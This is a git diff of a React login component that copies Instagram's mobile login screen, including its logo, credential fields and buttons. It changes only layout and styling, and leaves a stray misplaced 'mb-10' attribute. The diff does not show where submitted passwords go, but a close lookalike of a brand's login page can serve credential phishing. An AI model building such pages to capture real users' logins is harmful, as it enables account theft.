@@ -116,20 +116,20 @@ async function handleLogin(e) {
 
  return (
   <div className="min-h-screen bg-[#E5E6EA] flex items-center justify-center px-6 py-10">
-    <div className="w-full max-w-[320px] mx-auto">
+    <div className="w-full max-w-[300px] mx-auto">
 
       {/* Language */}
-      <p className="text-center text-gray-600 text-sm mb-6">
+      <p className="text-center text-gray-600 text-sm mb-8">
         English (UK)
       </p>
 
 
 
       {/* White Card */}
-      <div className="bg-white rounded-[40px] border border-gray-200 px-6 pt-8 pb-10 min-h-[800px] flex flex-col">
+      <div className="bg-white rounded-[38px] border border-gray-200 px-6 pt-8 pb-10 flex flex-col">
 
         {/* Logo */}
-        <div className="w-16 h-16 mx-auto mb-6">
+        <div className="w-14 h-14 mx-auto mb-8">
           <img
             src={instagramLogo}
             alt="Instagram Logo"
@@ -143,7 +143,7 @@ async function handleLogin(e) {
             value={username}
             onChange={(e) => setUsername(e.target.value)}
             placeholder="Mobile number or email address"
-            className="w-full h-12 rounded-2xl border border-gray-300 px-5 text-gray-700 placeholder-gray-400 outline-none mb-5 focus:ring-2 focus:ring-red-500"
+            className="w-full h-12 rounded-2xl border border-gray-300 px-5 mb-5 text-gray-700 placeholder-gray-400 outline-none  focus:ring-2 focus:ring-red-500"
           />
 
           <input
@@ -151,18 +151,18 @@ async function handleLogin(e) {
             value={password}
             onChange={(e) => setPassword(e.target.value)}
             placeholder="password"
-            className="w-full h-12 rounded-2xl border border-gray-300 px-5 text-gray-700 placeholder-gray-400 outline-none mb-6 focus:ring-2 focus:ring-red-500"
+            className="w-full h-12 rounded-2xl border border-gray-300 px-5 mb-5 text-gray-700 placeholder-gray-400 outline-none focus:ring-2 focus:ring-red-500"
           />
 
           <button
             type="submit"
             disabled={loading}
-            className="w-full h-14 rounded-full bg-[#4B61E8] hover:bg-[#4256d9] transition duration-200 text-white font-bold text-lg"
+            className="w-full h-12 rounded-full bg-[#4B61E8] hover:bg-[#4256d9] transition duration-200 text-white font-bold text-lg mb-8"
           >
             {loading ? "Logging in..." : "Log in"}
           </button>
 
-          <div className="mt-6 text-center">
+          <div className="mt-6 text-center" mb-10>
             <button
               type="button"
               className="text-gray-600 hover:underline text-base"
@@ -173,7 +173,7 @@ async function handleLogin(e) {
 
           <button
             type="button"
-            className="w-full h-14 mt-8 rounded-full border border-[#4B61E8] text-[#4B61E8] font-bold text-lg bg-white hover:bg-[#f7f8ff] transition duration-200"
+            className="w-full h-12 mt-8 rounded-full border border-[#4B61E8] text-[#4B61E8] font-semibold text-base bg-white hover:bg-[#f7f8ff] transition duration-200"
           >
             Create Account
           </button>
